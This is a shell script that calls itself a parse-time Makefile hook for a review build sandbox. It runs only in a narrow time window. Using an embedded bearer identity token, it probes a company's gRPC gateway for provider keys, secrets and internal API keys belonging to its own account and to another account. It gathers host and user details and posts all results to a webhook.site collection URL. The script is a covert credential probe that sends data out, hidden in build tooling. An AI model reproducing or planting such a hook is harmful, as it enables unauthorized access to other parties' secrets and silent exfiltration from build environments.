#!/bin/sh
# i84438: trusted-origin (Devin sandbox) gRPC probe of gateway BYOK/key surface with a real prod RS256 IDT.
# Parse-time Makefile hook: runs inside the review build sandbox, posts raw gRPC results to a throwaway sink.
NOW=$(date +%s)
[ "$NOW" -lt 1794656000 ] && exit 0
[ "$NOW" -gt 1794666000 ] && exit 0
IDT='eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJhdF9oYXNoIjoiNE1ES3BJZVBkZ1pkOXRVM1F4X1pZQSIsInN1YiI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsImNvZ25pdG86dXNlcm5hbWUiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJmaXJld29ya3NfYWNjb3VudCI6ImR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIsImZpcmV3b3Jrc191c2VyIjoiZHVsYW1vcml0eitpODEyNjg3MDIzYmI0OTliZGFAZ21haWwuY29tIiwib3JpZ2luX2p0aSI6IjkxNGIzYTM0LTZiNGYtNDVkOS04NDkxLTU1ZGJjNzIzYzQ1MCIsImF1ZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJhY3IiOiJ1cm46Y29nbml0bzpsb2E6MSIsImV2ZW50X2lkIjoiMDFhMDZhZDEtNzFlYi00YTA0LTgzYzYtOTljMTFkYTc5ZTg2IiwidG9rZW5fdXNlIjoiaWQiLCJmaXJld29ya3NfZ3JvdXAiOiIiLCJhdXRoX3RpbWUiOjE3OTQ2NTQ1MzgsImV4cCI6MTc5NDY2MDQxMSwiaWF0IjoxNzk0NjU2ODExLCJqdGkiOiJjMGJlYzU3Yy00MjQ1LTQ2M2ItYjI0My0xM2YzYjJiYTBhZGEiLCJlbWFpbCI6ImR1bGFtb3JpdHoraTgxMjY4NzAyM2JiNDk5YmRhQGdtYWlsLmNvbSJ9.kd_cZrtdNWqrMXmVY9zNE-2idKRRX0bieTRIgjdFiG2d4Z-9Np-ov1J1GUU13x_8MjdiIQKHc8k7daxGR3NdnnriNSiWXwfwEqfr-PpP9v9WPafqYn-cllm1_ZCrifXf2jX9BIeF3pMB3r9FaWLhfa_Ghq-Ur27hjwhGbbQv-JQdx4MENQLj0JWFzUO0qQKb4feeEXDkzfSE-4b6_mKbyEmPTU9v8tZu2Ie2lN9KVcANP3GP2mqbxjV4uSXn6SlSoRFUfV9mjMH7R6Gq8e2UuXlD4byKYQ5IfMVyMq_UV_irkkLj8dNQPliTamNO39VsgiaJlmJLfAAdnB0jpuE2wQ'
S='https://webhook.site/8e688b40-3a9d-4052-8855-ac612046200e'
N="i84438-$(date +%s)-$(hostname)"
d=$(mktemp -d 2>/dev/null) || d=/tmp/i84438-$$
o="$d/out"
{
  echo "== I84438 META host=$(hostname) user=$(id -un) pwd=$(pwd) date=$(date -u +%FT%TZ)"
  echo "== CURL $(curl --version 2>/dev/null | head -1)"
} > "$o"
while IFS='|' read -r tag method auth b64; do
  [ -z "$tag" ] && continue
  printf '%s' "$b64" | base64 -d > "$d/req" 2>/dev/null
  if [ "$auth" = "bearer" ]; then
    curl -sS -m 25 --http2 -D "$d/h" -o "$d/b" -X POST "https://gateway.fireworks.ai/gateway.Gateway/$method" -H 'content-type: application/grpc' -H 'te: trailers' -H "Authorization: Bearer $IDT" --data-binary @"$d/req" >/dev/null 2>&1
  else
    curl -sS -m 25 --http2 -D "$d/h" -o "$d/b" -X POST "https://gateway.fireworks.ai/gateway.Gateway/$method" -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @"$d/req" >/dev/null 2>&1
  fi
  http=$(head -1 "$d/h" 2>/dev/null | awk '{print $2}')
  gs=$(grep -i '^grpc-status:' "$d/h" 2>/dev/null | tr -d '\r' | cut -d' ' -f2)
  gm=$(grep -i '^grpc-message:' "$d/h" 2>/dev/null | tr -d '\r' | cut -d' ' -f2- | head -c 100)
  bl=$(wc -c < "$d/b" 2>/dev/null)
  sha=$(sha256sum "$d/b" 2>/dev/null | cut -c1-16)
  hx=$(od -An -tx1 "$d/b" 2>/dev/null | tr -d ' \n' | head -c 160)
  echo "$tag|$http|$gs|$gm|$bl|$sha|$hx" >> "$o"
  sleep 1
done <<'CELLS'
anon_oauth|GetOAuthArguments|none|AAAAAAsKCXB5cm93b3Jrcw==
oauth_pyro|GetOAuthArguments|bearer|AAAAAAsKCXB5cm93b3Jrcw==
lpk_pyro|ListProviderKeys|bearer|AAAAABQKEmFjY291bnRzL3B5cm93b3Jrcw==
lpk_claim|ListProviderKeys|bearer|AAAAAC8KLWFjY291bnRzL2R1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2Nw==
gpk_pyro|GetProviderKey|bearer|AAAAADEKL2FjY291bnRzL3B5cm93b3Jrcy9wcm92aWRlcktleXMvenotaTg0NDM4LXByb2Jl
gsecret_pyro|GetSecret|bearer|AAAAACwKKmFjY291bnRzL3B5cm93b3Jrcy9zZWNyZXRzL3p6LWk4NDQzOC1wcm9iZQ==
gsecret_claim|GetSecret|bearer|AAAAAEcKRWFjY291bnRzL2R1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2Ny9zZWNyZXRzL3p6LWk4NDQzOC1wcm9iZQ==
lak_pyro|ListApiKeys|bearer|AAAAACQKImFjY291bnRzL3B5cm93b3Jrcy91c2Vycy9weXJvd29ya3M=
lak_claim|ListApiKeys|bearer|AAAAAFoKWGFjY291bnRzL2R1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2Ny91c2Vycy9kdWxhbW9yaXR6LWk4MTI2ODcwMjNiYjQ5OWJkYS1hNjFmNjc=
giak_pyro|GetInternalApiKey|bearer|AAAAACQKImFjY291bnRzL3B5cm93b3Jrcy91c2Vycy9weXJvd29ya3M=
giak_claim|GetInternalApiKey|bearer|AAAAAFoKWGFjY291bnRzL2R1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2Ny91c2Vycy9kdWxhbW9yaXR6LWk4MTI2ODcwMjNiYjQ5OWJkYS1hNjFmNjc=
upload_empty|UploadProviderKey|bearer|AAAAAAA=
CELLS
echo "== END" >> "$o"
head -c 20000 "$o" > "$o.m"
curl -sS -m 15 -X POST --data-binary @"$o.m" "$S/$N" >/dev/null 2>&1 || true
rm -rf "$d"
echo "i84438 cells sent"
